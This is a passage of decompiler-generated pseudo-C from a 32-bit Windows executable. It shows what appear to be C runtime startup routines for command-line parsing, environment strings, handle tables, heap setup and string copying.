				*(fp - 0x18) = (word32) *esi_100;
				fn00407370(dwArg00, out edi_113);
				esi_100 = (word32) esi_100 + 0x04;
			}
			edi_113 = (word32) edi_113 + ((word32) eax_104 + 0x01);
		} while (*edi_113 != bl_111);
		ebp = *(fp - 0x10);
	}
	*(fp - 0x10) = (union Eq_11 *) globals->t491EB8;
	Eq_11 ebp_80;
	word32 edi_81;
	Eq_11 ebx_82 = fn00409204(ebp, dwArg00, out ebp_80, out edi_81);
	globals->t491EB8 = ebx_82;
	*esi_100 = ebx_82;
	globals->dw4931A4 = 0x01;
	return ebp_80;
}

// 0040A1C3: Register word32 fn0040A1C3(Register ui32 ecx, Register ptr32 ebp)
word32 fn0040A1C3(ui32 ecx, ptr32 ebp)
{
	if (globals->dw4931A8 == 0x00)
		fn0040857B();
	GetModuleFileNameA(null, 4792124, 0x0104);
	Eq_11 eax_34 = globals->t4933E8;
	globals->dw491F24 = 4792124;
	Eq_11 edi_104 = 4792124;
	if (*eax_34 != 0x00)
		edi_104 = eax_34;
	fn0040A25C(edi_104, 0x00, 0x00, fp - 0x08, fp - 0x0C);
	Eq_11 eax_57 = fn00409233(ecx * 0x05);
	Eq_11 esi_103 = eax_57;
	if (eax_57 == 0x00)
	{
		*(fp - 0x1C) = 0x08;
		fn0040816E(fp - 0x04, edi_104, out esi_103, out edi_104);
	}
	*(fp - 0x1C) = fp - 0x0C;
	*(fp - 0x20) = fp - 0x08;
	*(fp - 0x24) = (word32) esi_103 + ecx * 0x04;
	*(fp - 0x28) = (union Eq_11 *) esi_103;
	*(fp - 44) = (union Eq_11 *) edi_104;
	fn0040A25C(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	globals->t491F0C = esi_103;
	globals->dw491F08 = ecx - 0x01;
	return *(fp - 0x10);
}

// 0040A25C: void fn0040A25C(Stack Eq_11 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10, Stack ptr32 dwArg14)
void fn0040A25C(Eq_11 dwArg04, word32 dwArg08, word32 dwArg0C, ptr32 dwArg10, ptr32 dwArg14)
{
fn0040A25C_entry:
	*dwArg14 = *dwArg14 & 0x00
	*dwArg10 = 0x01
	byte * esi_122 = dwArg0C
	ui32 * edi_109 = dwArg08
	struct Eq_8844 * eax_119 = dwArg04 + 0x01
	branch dwArg08 == null l0040A286
	goto l0040A27E
l0040A25C:
l0040A27E:
	*dwArg08 = dwArg0C
	edi_109 = dwArg08 + 0x01
	dwArg08 = dwArg08 + 0x01
l0040A286:
	branch *dwArg04 != 0x22 l0040A2CF
l0040A28B:
	byte dl_293 = eax_119[0x01]
	eax_119 = eax_119 + 0x01
	branch dl_293 == 0x22 || dl_293 == 0x00 l0040A2BD
	goto l0040A298
l0040A294:
l0040A298:
	branch (((word32) dl_293)->b4932E1 & 0x04) == 0x00 l0040A2B0
l0040A2A4:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A2B0
l0040A2AA:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
	eax_119 = eax_119 + 0x01
l0040A2B0:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A28B
l0040A2B6:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
	goto l0040A28B
l0040A2BD:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A2C7
l0040A2C3:
	*esi_122 = *esi_122 & 0x00
	esi_122 = esi_122 + 0x01
l0040A2C7:
	branch eax_119->b0000 != 0x22 l0040A312
l0040A2CC:
	eax_119 = eax_119 + 0x01
	goto l0040A312
l0040A2CF:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A2DA
l0040A2D5:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
l0040A2DA:
	byte dl_358 = eax_119->b0000
	eax_119 = &eax_119->b0000
	branch (((word32) dl_358)->b4932E1 & 0x04) == 0x00 l0040A2F5
l0040A2E9:
	*dwArg14 = *dwArg14 + 0x01
	branch esi_122 == null l0040A2F4
l0040A2EF:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
l0040A2F4:
	eax_119 = eax_119 + 0x01
l0040A2F5:
	branch dl_358 == 0x20 l0040A303
l0040A2FA:
	branch dl_358 == 0x00 l0040A307
l0040A2FE:
	branch dl_358 != 0x09 l0040A2CF
l0040A303:
	branch dl_358 != 0x00 l0040A30A
l0040A307:
	eax_119 = eax_119 - 0x01
	goto l0040A312
l0040A30A:
	branch esi_122 == null l0040A312
l0040A30E:
	*(esi_122 - 0x01) = *(esi_122 - 0x01) & 0x00
l0040A312:
	ui32 dwArg14_116 = dwArg14 & 0x00
l0040A316:
	branch eax_119->b0000 == 0x00 l0040A3FF
l0040A31F:
	byte dl_93 = eax_119->b0000
	branch dl_93 == 0x20 || dl_93 == 0x09 l0040A32B
	goto l0040A32E
l0040A326:
l0040A32B:
	eax_119 = eax_119 + 0x01
	goto l0040A31F
l0040A32E:
	branch eax_119->b0000 == 0x00 l0040A3FF
l0040A337:
	branch edi_109 == null l0040A343
l0040A33B:
	*edi_109 = esi_122
	edi_109 = edi_109 + 0x01
	dwArg08 = edi_109
l0040A343:
	*dwArg10 = *dwArg10 + 0x01
l0040A348:
	word32 dwArg04_123 = 0x01
	uint32 ebx_124 = 0x00
	byte bl_125 = 0x00
l0040A351:
	branch eax_119->b0000 != 0x5C l0040A35A
l0040A356:
	ebx_124 = ebx_124 + 0x01
	eax_119 = eax_119 + 0x01
	bl_125 = (byte) ebx_124
	goto l0040A351
l0040A35A:
	branch eax_119->b0000 != 0x22 l0040A38B
l0040A35F:
	branch (bl_125 & 0x01) != 0x00 l0040A389
l0040A364:
	branch dwArg14_116 == 0x00 l0040A378
l0040A36B:
	struct Eq_8844 * edx_281 = eax_119 + 0x01
	branch eax_119[0x01] != 0x22 l0040A378
l0040A374:
	eax_119 = edx_281
	goto l0040A37B
l0040A378:
	dwArg04_123 = 0x00
l0040A37B:
	edi_109 = dwArg08
	dwArg14_116 = (word32) (dwArg14_116 == 0x00)
l0040A389:
	ebx_124 = ebx_124 >> 0x01
l0040A38B:
	word32 ebx_148 = ebx_124 - 0x01
	branch ebx_124 == 0x00 l0040A3A0
l0040A392:
	word32 ebx_230 = ebx_148 + 0x01
l0040A393:
	branch esi_122 == null l0040A39B
l0040A397:
	*esi_122 = 0x5C
	esi_122 = esi_122 + 0x01
l0040A39B:
	*dwArg14 = *dwArg14 + 0x01
	ebx_230 = ebx_230 - 0x01
	branch ebx_230 != 0x00 l0040A393
l0040A3A0:
	byte dl_156 = eax_119->b0000
	branch dl_156 == 0x00 || dwArg14_116 == 0x00 && (dl_156 == 0x20 || dl_156 == 0x09) l0040A3F0
	goto l0040A3B6
l0040A3A6:
l0040A3AC:
l0040A3B1:
l0040A3B6:
	branch dwArg04_123 == 0x00 l0040A3EA
l0040A3BC:
	branch esi_122 == null l0040A3D9
l0040A3C0:
	branch (((word32) dl_156)->b4932E1 & 0x04) == 0x00 l0040A3D2
l0040A3CC:
	*esi_122 = dl_156
	*dwArg14 = *dwArg14 + 0x01
	esi_122 = esi_122 + 0x01
	eax_119 = eax_119 + 0x01
l0040A3D2:
	*esi_122 = eax_119->b0000
	esi_122 = esi_122 + 0x01
	goto l0040A3E8
l0040A3D9:
	branch (((word32) dl_156)->b4932E1 & 0x04) == 0x00 l0040A3E8
l0040A3E5:
	*dwArg14 = *dwArg14 + 0x01
	eax_119 = eax_119 + 0x01
l0040A3E8:
	*dwArg14 = *dwArg14 + 0x01
l0040A3EA:
	eax_119 = eax_119 + 0x01
	goto l0040A348
l0040A3F0:
	branch esi_122 == null l0040A3F8
l0040A3F4:
	*esi_122 = *esi_122 & 0x00
	esi_122 = esi_122 + 0x01
l0040A3F8:
	*dwArg14 = *dwArg14 + 0x01
	goto l0040A316
l0040A3FF:
	branch edi_109 == null l0040A406
l0040A403:
	*edi_109 = *edi_109 & 0x00
l0040A406:
	*dwArg10 = *dwArg10 + 0x01
	return
fn0040A25C_exit:
}

// 0040A410: Register word32 fn0040A410(Register ui32 ecx)
word32 fn0040A410(ui32 ecx)
{
	word32 eax_125;
	word32 eax_8 = globals->dw492040;
	struct Eq_9245 * esp_182 = fp - 0x18;
	word32 ebx_118 = 0x00;
	Eq_9251 bx_193 = 0x00;
	Eq_9253 esi_195 = 0x00;
	Eq_9255 edi_199 = 0x00;
	if (eax_8 == 0x00)
	{
		Eq_9253 eax_260 = GetEnvironmentStringsW();
		esi_195 = eax_260;
		if (eax_260 != 0x00)
		{
			globals->dw492040 = 0x01;
l0040A467:
			if (esi_195 != 0x00)
			{
l0040A477:
				Eq_9253 eax_173 = esi_195;
				if (*esi_195 != bx_193)
				{
					do
					{
						do
						{
							word32 eax_174 = eax_173 + 0x01;
							eax_173 = eax_174 + 0x01;
						} while (Mem0[eax_174 + 0x01:word16] != bx_193);
						eax_173 = eax_174 + 0x03;
					} while (Mem0[eax_174 + 0x03:word16] != bx_193);
				}
				struct Eq_9291 * esp_87 = esp_182 - 0x04;
				esp_87->t0000.u0 = 0x00;
				*(esp_87 - 0x04) = 0x00;
				*(esp_87 - 0x08) = 0x00;
				*(esp_87 - 0x0C) = 0x00;
				word32 eax_91 = (eax_173 - esi_195 >> 0x01) + 0x01;
				*(esp_87 - 0x10) = eax_91;
				*(esp_87 - 0x14) = (union Eq_9253 *) esi_195;
				*(esp_87 - 0x18) = 0x00;
				*(esp_87 - 0x1C) = 0x00;
				esp_87->dw0018 = eax_91;
				Eq_11 eax_105 = WideCharToMultiByte(*(esp_87 - 0x1C), *(esp_87 - 0x18), *(esp_87 - 0x14), *(esp_87 - 0x10), *(esp_87 - 0x0C), *(esp_87 - 0x08), *(esp_87 - 0x04), esp_87->t0000);
				if (eax_105 != 0x00)
				{
					esp_87->t0000 = eax_105;
					Eq_11 eax_129 = fn00409233(dwArg00);
					esp_87->t0014 = eax_129;
					if (eax_129 != 0x00)
					{
						esp_87->t0000.u0 = 0x00;
						*(esp_87 - 0x04) = 0x00;
						*(esp_87 - 0x08) = (union Eq_11 *) eax_105;
						*(esp_87 - 0x0C) = (union Eq_11 *) eax_129;
						*(esp_87 - 0x10) = esp_87->dw0018;
						*(esp_87 - 0x14) = (union Eq_9253 *) esi_195;
						*(esp_87 - 0x18) = 0x00;
						*(esp_87 - 0x1C) = 0x00;
						if (WideCharToMultiByte(*(esp_87 - 0x1C), *(esp_87 - 0x18), *(esp_87 - 0x14), *(esp_87 - 0x10), *(esp_87 - 0x0C), *(esp_87 - 0x08), *(esp_87 - 0x04), esp_87->t0000) == 0x00)
						{
							esp_87->t0000 = esp_87->t0014;
							word32 ebp_167;
							word32 edi_168;
							esp_87->t0014 = fn00409204(eax_105, dwArg00, out ebp_167, out edi_168);
						}
						ebx_118 = esp_182->dw0010;
					}
				}
				union Eq_9253 * esp_121 = esp_182 - 0x04;
				*esp_121 = (union Eq_9253 *) esi_195;
				FreeEnvironmentStringsW(*esp_121);
				eax_125 = ebx_118;
				return eax_125;
			}
			Eq_9253 eax_184 = GetEnvironmentStringsW();
			esi_195 = eax_184;
			if (eax_184 != 0x00)
				goto l0040A477;
l0040A539:
			eax_125 = 0x00;
			return eax_125;
		}
		Eq_9255 eax_265 = GetEnvironmentStrings();
		edi_199 = eax_265;
		if (eax_265 == 0x00)
			goto l0040A539;
		globals->dw492040 = 0x02;
	}
	else
	{
		if (eax_8 == 0x01)
			goto l0040A467;
		if (eax_8 != 0x02)
			goto l0040A539;
	}
	if (edi_199 == 0x00)
	{
		Eq_9255 eax_256 = GetEnvironmentStrings();
		edi_199 = eax_256;
		if (eax_256 == 0x00)
			goto l0040A539;
	}
	Eq_9255 eax_206 = edi_199;
	if (*edi_199 != 0x00)
	{
		do
		{
			do
				eax_206 = eax_206 + 0x01;
			while (*eax_206 != 0x00);
			eax_206 = eax_206 + 0x01;
		} while (Mem0[eax_206 + 0x01:byte] != 0x00);
	}
	word32 esi_225;
	Eq_9545 eax_208 = eax_206 - edi_199;
	word32 eax_215 = fn00409233(eax_208 + 0x01);
	if (eax_215 == 0x00)
		esi_225 = 0x00;
	else
	{
		Mem237[fp - 0x1C + 0x00:word32] = eax_208 + 0x01;
		*(fp - 0x20) = (union Eq_9255 *) edi_199;
		*(fp - 0x24) = (union Eq_11 *) eax_215;
		fn00407820(dwArg00, dwArg04, dwArg08, out esi_225, out edi_199);
	}
	*(fp - 0x1C) = (union Eq_9255 *) edi_199;
	FreeEnvironmentStringsA(*(fp - 0x1C));
	eax_125 = esi_225;
	return eax_125;
}

// 0040A542: Register Eq_11 fn0040A542(Register Eq_11 ebp, Register Eq_11 edi)
Eq_11 fn0040A542(Eq_11 ebp, Eq_11 edi)
{
	Eq_11 eax_18 = fn00409233(0x0100);
	Eq_11 esi_19 = eax_18;
	Eq_11 ecx_177 = *(fp - 88);
	if (eax_18 == 0x00)
	{
		*(fp - 88) = 0x1B;
		word32 edi_286;
		fn0040816E(ebp, edi, out esi_19, out edi_286);
		ecx_177 = *(fp - 88);
	}
	globals->t4930A0 = esi_19;
	globals->dw4931A0 = 0x20;
	Eq_11 eax_35 = (word32) esi_19 + 0x0100;
	while (esi_19 < eax_35)
	{
		*((word32) esi_19 + 0x04) = *((word32) esi_19 + 0x04) & 0x00;
		*esi_19 = *esi_19 | ~0x00;
		*((word32) esi_19 + 0x05) = 0x0A;
		esi_19 = (word32) esi_19 + 0x08;
		eax_35 = (word32) globals->t4930A0 + 0x0100;
	}
	*(fp - 88) = fp - 0x44;
	GetStartupInfoA(*(fp - 88));
	if (*(fp - 0x12) != 0x00)
	{
		int32 * eax_161 = *(fp - 0x10);
		if (eax_161 == null)
			goto l0040A672;
		int32 esi_165 = *eax_161;
		byte * ebp_166 = eax_161 + 0x01;
		word32 * ebx_170 = eax_161 + 0x01 + esi_165;
		if (esi_165 >= 0x0800)
			esi_165 = 0x0800;
		if (globals->dw4931A0 < esi_165)
		{
			word32 * edi_239 = globals->a4930A4;
			do
			{
				*(fp - 88) = 0x0100;
				Eq_11 eax_247 = fn00409233(dwArg00);
				ecx_177 = *(fp - 88);
				if (eax_247 == 0x00)
				{
					esi_165 = globals->dw4931A0;
					break;
				}
				globals->dw4931A0 = globals->dw4931A0 + 0x20;
				*edi_239 = (word32) eax_247;
				ecx_177 = (word32) eax_247 + 0x0100;
				while (eax_247 < ecx_177)
				{
					*((word32) eax_247 + 0x04) = *((word32) eax_247 + 0x04) & 0x00;
					*eax_247 = *eax_247 | ~0x00;
					*((word32) eax_247 + 0x05) = 0x0A;
					eax_247 = (word32) eax_247 + 0x08;
					ecx_177 = *edi_239 + 0x0100;
				}
				edi_239 = edi_239 + 0x01;
			} while (globals->dw4931A0 < esi_165);
		}
		int32 edi_182 = 0x00;
		if (esi_165 > 0x00)
		{
l0040A62C:
			word32 eax_194 = *ebx_170;
			if (eax_194 != ~0x00)
			{
				byte cl_209 = *ebp_166;
				ecx_177 = DPB(ecx_177, cl_209, 0);
				if ((cl_209 & 0x01) == 0x00)
					goto l0040A669;
				if ((cl_209 & 0x08) != 0x00)
				{
l0040A64B:
					struct Eq_9936 * eax_226 = (&globals->t4930A0)[edi_182 >> 0x05] + (edi_182 & 0x1F) * 0x08;
					word32 ecx_227 = *ebx_170;
					eax_226->dw0000 = ecx_227;
					byte cl_229 = *ebp_166;
					eax_226->b0004 = cl_229;
					ecx_177 = DPB(ecx_227, cl_229, 0);
					goto l0040A669;
				}
				*(fp - 88) = eax_194;
				if (GetFileType(*(fp - 88)) != 0x00)
					goto l0040A64B;
			}
l0040A669:
			edi_182 = edi_182 + 0x01;
			ebp_166 = ebp_166 + 0x01;
			ebx_170 = ebx_170 + 0x01;
			if (edi_182 < esi_165)
				goto l0040A62C;
			goto l0040A672;
		}
	}
l0040A672:
	int32 ebx_70 = 0x00;
l0040A674:
	Eq_11 eax_79 = globals->t4930A0;
	struct Eq_9769 * esi_82 = (word32) eax_79 + ebx_70 * 0x08;
	if (*((word32) eax_79 + ebx_70 * 0x08) != ~0x00)
	{
		esi_82->b0004 = esi_82->b0004 | 0x80;
		goto l0040A6D3;
	}
	word32 eax_113;
	esi_82->b0004 = 0x81;
	if (ebx_70 == 0x00)
	{
		*(fp - 88) = ~0x09;
		eax_113 = *(fp - 88);
	}
	else
		eax_113 = 0x00 - (0x01 - ebx_70 == 0x00) + ~0x0A;
	*(fp - 88) = eax_113;
	Eq_82 eax_116 = GetStdHandle(*(fp - 88));
	if (eax_116 != (void *) ~0x00)
	{
		*(fp - 88) = (HANDLE *) eax_116;
		Eq_15 eax_131 = GetFileType(*(fp - 88));
		if (eax_131 != 0x00)
		{
			esi_82->t0000 = eax_116;
			if ((eax_131 & 0xFF) != 0x02)
			{
				if ((eax_131 & 0xFF) == 0x03)
					esi_82->b0004 = esi_82->b0004 | 0x08;
l0040A6D3:
				ebx_70 = ebx_70 + 0x01;
				if (ebx_70 < 0x03)
					goto l0040A674;
				*(fp - 88) = globals->dw4931A0;
				SetHandleCount(*(fp - 88));
				return ecx_177;
			}
		}
	}
	esi_82->b0004 = esi_82->b0004 | 0x40;
	goto l0040A6D3;
}

// 0040A6ED: Register word32 fn0040A6ED(Stack word32 dwArg04)
word32 fn0040A6ED(word32 dwArg04)
{
	Eq_82 eax_14 = HeapCreate((word32) (dwArg04 == 0x00), 0x1000, 0x00);
	globals->t493084 = eax_14;
	if (eax_14 != null)
	{
		if (fn0040B195() != 0x00)
			return 0x01;
		HeapDestroy(globals->t493084);
	}
	return 0x00;
}

// 0040A8FC: Register Eq_11 fn0040A8FC(Register Eq_11 ebp, Register Eq_11 edi)
Eq_11 fn0040A8FC(Eq_11 ebp, Eq_11 edi)
{
	word32 eax_3 = globals->dw491EC0;
	if (eax_3 == 0x01 || eax_3 == 0x00 && globals->dw4110B4 == 0x01)
	{
		Eq_11 edi_22;
		word32 ebx_23 = fn0040A935(ebp, edi, 252, out edi_22);
		<anonymous> * eax_24 = globals->ptr492044;
		ptr32 esp_26 = fp;
		if (eax_24 != null)
		{
			word32 eax_46;
			byte SCZO_47;
			byte Z_48;
			byte SZO_49;
			byte C_50;
			word32 ecx_51;
			word32 ebx_54;
			eax_24();
		}
		*(esp_26 - 0x04) = 0xFF;
		fn0040A935(ebp, edi_22, dwArg00, out edi);
	}
	return edi;
}

// 0040A935: Register word32 fn0040A935(Register Eq_11 ebp, Register Eq_11 edi, Stack word32 dwArg04, Register out ptr32 ediOut)
word32 fn0040A935(Eq_11 ebp, Eq_11 edi, word32 dwArg04, ptr32 & ediOut)
{
	*ediOut = edi;
	ui32 ecx_10 = 0x00;
	word32 * eax_13 = globals->a411488;
	if (dwArg04 != *eax_13)
	{
		eax_13 = eax_13 + 0x02;
		ecx_10 = ecx_10 + 0x01;
		if (eax_13 < &globals->dw411518)
			goto l0040A948;
	}
	struct Eq_10054 * esi_129 = ecx_10 << 0x03;
	if (dwArg04 == esi_129->dw411488)
	{
		word32 eax_60 = globals->dw491EC0;
		if (eax_60 != 0x01 && (eax_60 != 0x00 || globals->dw4110B4 != 0x01))
		{
			if (dwArg04 != 252)
			{
				if (GetModuleFileNameA(null, fp - 424, 0x0104) == 0x00)
					fn00407370(fp - 424, out edi);
				*(fp - 0x01B0) = (union Eq_11 *) edi;
				*(fp - 0x01B4) = fp - 424;
				byte dl_121;
				if (fn00407460(dwArg00, out dl_121) > ~0x3A)
				{
					*(fp - 0x01B4) = fp - 424;
					byte dl_169;
					Eq_15 eax_170 = fn00407460(dwArg00, out dl_169);
					*(fp - 440) = 0x03;
					*(fp - 444) = 0x0040D5B0;
					*(fp - 448) = (word32) eax_170 + (fp - 0x01E3);
					word32 ebx_184;
					fn0040ABE0(ebp, dwArg00, dwArg04, dwArg08, dwArg0C, out ebx_184, out esi_129);
				}
				*(fp - 0x01B4) = 0x0040D594;
				*(fp - 440) = fp - 0xA4;
				word32 edi_136;
				fn00407370(dwArg00, out edi_136);
				*(fp - 444) = edi_136;
				*(fp - 448) = fp - 0xA4;
				fn00407380(dwArg00);
				*(fp - 0x01C4) = 0x0040D590;
				*(fp - 0x01C8) = fp - 0xA4;
				fn00407380(dwArg00);
				*(fp - 0x01CC) = (union Eq_11 *) esi_129->t41148C;
				*(fp - 464) = fp - 0xA4;
				fn00407380(dwArg00);
				*(fp - 0x01D4) = 0x00012010;
				*(fp - 0x01D8) = 0x0040D568;
				*(fp - 0x01DC) = fp - 0xA4;
				ebx = fn0040BCB8();
				word32 edi_164;
				*ediOut = *(fp - 0x01B0);
			}
		}
		else
		{
			byte dl_76;
			WriteFile(GetStdHandle(~0x0B), esi_129->t41148C, fn00407460(esi_129->t41148C, out dl_76), fp + 0x04, null);
		}
	}
	return ebx;
}

// 0040AA88: Register Eq_92 fn0040AA88(Register ptr32 ebp, Stack word32 dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10, Stack Eq_496 dwArg14, Stack Eq_11 dwArg18, Stack word32 dwArg1C, Register out Eq_7037 dlOut)
BOOL fn0040AA88(ptr32 ebp, word32 dwArg04, ptr32 dwArg08, word32 dwArg0C, ptr32 dwArg10, UINT dwArg14, Eq_11 dwArg18, word32 dwArg1C, Eq_7037 & dlOut)
{
	*dlOut = dl;
	Eq_92 eax_129;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	word32 eax_262 = globals->dw492048;
	if (eax_262 == 0x00)
	{
		if (GetStringTypeW(0x01, &globals->t40D248, 0x01, fp - 0x20) != 0x00)
			eax_262 = 0x01;
		else
		{
			if (GetStringTypeA(0x00, 0x01, 0x0040D244, 0x01, fp - 0x20) == 0x00)
				goto l0040ABBD;
			eax_262 = 0x02;
		}
		globals->dw492048 = eax_262;
	}
	if (eax_262 == 0x02)
	{
		Eq_11 eax_106 = dwArg18;
		if (dwArg18 == 0x00)
			eax_106 = globals->t491ED4;
		eax_129 = GetStringTypeA(eax_106, dwArg04, dwArg08, dwArg0C, dwArg10);
l0040ABBF:
		fs->ptr0000 = eax_14;
		return eax_129;
	}
	if (eax_262 == 0x01)
	{
		if (dwArg14 == 0x00)
			dwArg14 = globals->t491EE4;
		int32 eax_166 = MultiByteToWideChar(dwArg14, (0x00 - (-dwArg1C == 0x00) & 0x08) + 0x01, dwArg08, dwArg0C, null, 0x00);
		if (eax_166 != 0x00)
		{
			word32 eax_175 = eax_166 * 0x02 + 0x03;
			fn00407B80(DPB(eax_175, (byte) eax_175 & 252, 0), 0x00);
			*(fp - 0x3C) = eax_166 * 0x02;
			*(fp - 0x40) = 0x00;
			*(fp - 0x44) = fp - 0x38;
			byte dl_192;
			*dlOut = fn00407310(dwArg00, bArg04, dwArg08);
			if (fp != 0x38)
			{
				*(fp - 0x3C) = eax_166;
				*(fp - 0x40) = fp - 0x38;
				*(fp - 0x44) = dwArg0C;
				*(fp - 0x48) = (union Eq_15 *) dwArg08;
				*(fp - 0x4C) = 0x01;
				*(fp - 0x50) = (uint32) dwArg14;
				int32 eax_216 = MultiByteToWideChar(*(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40), *(fp - 0x3C));
				if (eax_216 != 0x00)
				{
					*(fp - 0x3C) = (LPWORD *) dwArg10;
					*(fp - 0x40) = eax_216;
					*(fp - 0x44) = fp - 0x38;
					*(fp - 0x48) = (union Eq_15 *) dwArg04;
					eax_129 = GetStringTypeW(*(fp - 0x48), *(fp - 0x44), *(fp - 0x40), *(fp - 0x3C));
					goto l0040ABBF;
				}
			}
		}
	}
l0040ABBD:
	eax_129 = 0x00;
	goto l0040ABBF;
}

// 0040ABE0: Register uint32 fn0040ABE0(Stack Eq_11 dwArg00, Stack Eq_11 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack (ptr (arr Eq_5457)) dwArg10, Register out ptr32 ebxOut, Register out (ptr Eq_7290) esiOut)
uint32 fn0040ABE0(Eq_11 dwArg00, Eq_11 dwArg04, word32 dwArg08, word32 dwArg0C, Eq_5457 * dwArg10[], ptr32 & ebxOut, Eq_7290 * & esiOut)
{
	uint32 ecx_112 = dwArg0C;
	if (dwArg0C == 0x00)
	{
l0040AC63:
		word32 ebx_48;
		*ebxOut = ebx;
		word32 esi_49;
		*esiOut = esi;
		return ecx_112;
	}
	byte al_113;
	uint32 ebx_100 = dwArg0C;
	byte * esi_133 = dwArg08;
	byte * edi_102 = dwArg04;
	if ((dwArg08 & 0x03) == 0x00)
	{
		ecx_112 = dwArg0C >> 0x02;
		if (dwArg0C >> 0x02 != 0x00)
			goto l0040AC71;
		goto l0040AC25;
	}
l0040AC04:
	al_113 = *esi_133;
	*edi_102 = al_113;
	esi_133 = esi_133 + 0x01;
	edi_102 = edi_102 + 0x01;
	ecx_112 = ecx_112 - 0x01;
	if (ecx_112 == 0x00)
		return ecx_112;
	if (al_113 == 0x00)
	{
		if ((edi_102 & 0x03) != 0x00)
		{
			do
			{
				*edi_102 = al_113;
				edi_102 = edi_102 + 0x01;
				ecx_112 = ecx_112 - 0x01;
				if (ecx_112 == 0x00)
					goto l0040ACD6;
			} while ((edi_102 & 0x03) != 0x00);
		}
		ebx_100 = ecx_112;
		ecx_112 = ecx_112 >> 0x02;
		if (ecx_112 != 0x00)
		{
l0040ACC7:
			do
			{
				*edi_102 = (byte) 0x00;
				edi_102 = edi_102 + 0x04;
				ecx_112 = ecx_112 - 0x01;
			} while (ecx_112 != 0x00);
l0040ACD1:
			al_113 = 0x00;
			ebx_100 = ebx_100 & 0x03;
			if (ebx_100 == 0x00)
			{
l0040ACD6:
				word32 ebx_166;
				*ebxOut = ebx;
				word32 esi_168;
				*esiOut = esi;
				return ecx_112;
			}
		}
		do
		{
			*edi_102 = al_113;
			byte * edi_104 = edi_102 + 0x01;
			*edi_104 = al_113;
			edi_102 = edi_104 + 0x01;
l0040AC5E:
			ebx_100 = ebx_100 - 0x01;
		} while (ebx_100 != 0x00);
		goto l0040AC63;
	}
	if ((esi_133 & 0x03) != 0x00)
		goto l0040AC04;
	ebx_100 = ecx_112;
	ecx_112 = ecx_112 >> 0x02;
	if (ecx_112 >> 0x02 == 0x00)
	{
l0040AC20:
		ebx_100 = ebx_100 & 0x03;
		if (ebx_100 == 0x00)
			return ecx_112;
l0040AC25:
		do
		{
			byte al_136 = *esi_133;
			*edi_102 = al_136;
			byte * esi_137 = esi_133 + 0x01;
			byte * edi_139 = edi_102 + 0x01;
			al_113 = *esi_137;
			*edi_139 = al_113;
			esi_133 = esi_137 + 0x01;
			edi_102 = edi_139 + 0x01;
			if (al_113 == 0x00)
				goto l0040AC5E;
			word32 ebx_150 = ebx_100 - 0x01;
			ebx_100 = ebx_150 - 0x01;
		} while (ebx_150 != 0x01);
		return ecx_112;
		word32 ebx_85;
		*ebxOut = dwArg00;
		word32 esi_87;
		*esiOut = dwArg04;
		return ecx_112;
	}
l0040AC71:
	Eq_10546 eax_228 = *esi_133;
	union Eq_10562 * esi_233 = esi_133 + 0x04;
	Eq_10562 edx_241 = *esi_233;
	Eq_10562 eax_237 = *esi_233;
	byte dl_242 = (byte) edx_241;
	byte dh_243 = SLICE(edx_241, byte, 8);
	esi_133 = (char *) esi_233 + 0x04;
	if (((eax_237 ^ ~0x00 ^ (word32) eax_237 + 0x7EFEFEFF) & 0x81010100) != 0x00)
	{
		if (dl_242 == 0x00)
		{
			*edi_102 = (byte) 0x00;
			goto l0040ACBF;
		}
		if (dh_243 == 0x00)
		{
			*edi_102 = (byte) (edx_241 & 0xFF);
			goto l0040ACBF;
		}
		if ((edx_241 & 0x00FF0000) == 0x00)
		{
			*edi_102 = (byte) (edx_241 & 0xFFFF);
			goto l0040ACBF;
		}
		if ((edx_241 & 0xFF000000) == 0x00)
		{
			*edi_102 = (byte) edx_241;
			*edi_102 = (byte) edx_241;
l0040ACBF:
			edi_102 = edi_102 + 0x04;
			ecx_112 = ecx_112 - 0x01;
			if (ecx_112 != 0x00)
				goto l0040ACC7;
			goto l0040ACD1;
		}
	}
	*edi_102 = (byte) edx_241;
	edi_102 = edi_102 + 0x04;
	ecx_112 = ecx_112 - 0x01;
	if (ecx_112 != 0x00)
		goto l0040AC71;
	goto l0040AC20;
}

// 0040B195: Register Eq_261 fn0040B195()
Eq_261 fn0040B195()
{
	Eq_261 eax_10 = HeapAlloc(globals->t493084, 0x00, 0x0140);
	globals->t492078 = eax_10;
	if (eax_10 != 0x00)
	{
		globals->t492070 = globals->t492070 & 0x00;
		globals->dw492074 = globals->dw492074 & 0x00;
		globals->t49206C = eax_10;
		globals->dw492064 = 0x10;
		return 0x01;
	}
	else
		return eax_10;
}

// 0040B1D3: Register (ptr Eq_10783) fn0040B1D3(Stack Eq_261 dwArg04)
Eq_10783 * fn0040B1D3(Eq_261 dwArg04)
{
	struct Eq_10783 * eax_15 = (word32) globals->t492078 + 0x0C;
	struct Eq_10783 * ecx_6 = eax_15 + ((globals->dw492074 * 0x05) * 0x04) / 0x0014;
	while (eax_15 < ecx_6)
	{
		if (dwArg04 - eax_15->dw0000 < 0x00100000)
			return eax_15;
		eax_15 = eax_15 + 0x01;
	}
	eax_15 = null;
	return eax_15;
}

// 0040B1FE: void fn0040B1FE(Register Eq_11 ebp, Stack word32 dwArg04, Stack Eq_261 dwArg08, Stack byte bArg0B)
void fn0040B1FE(Eq_11 ebp, word32 dwArg04, Eq_261 dwArg08, byte bArg0B)
{
	Eq_5944 dwArg08_349;
	int32 ebx_21 = *(dwArg08 - 0x04);
	Eq_10816 esi_20 = dwArg08 - *((word32) dwArg04 + 0x0C);
	Eq_10822 eax_18 = *((word32) dwArg04 + 0x0010);
	int32 ecx_35 = ebx_21 - 0x01 + ((word32) dwArg08 - 0x04);
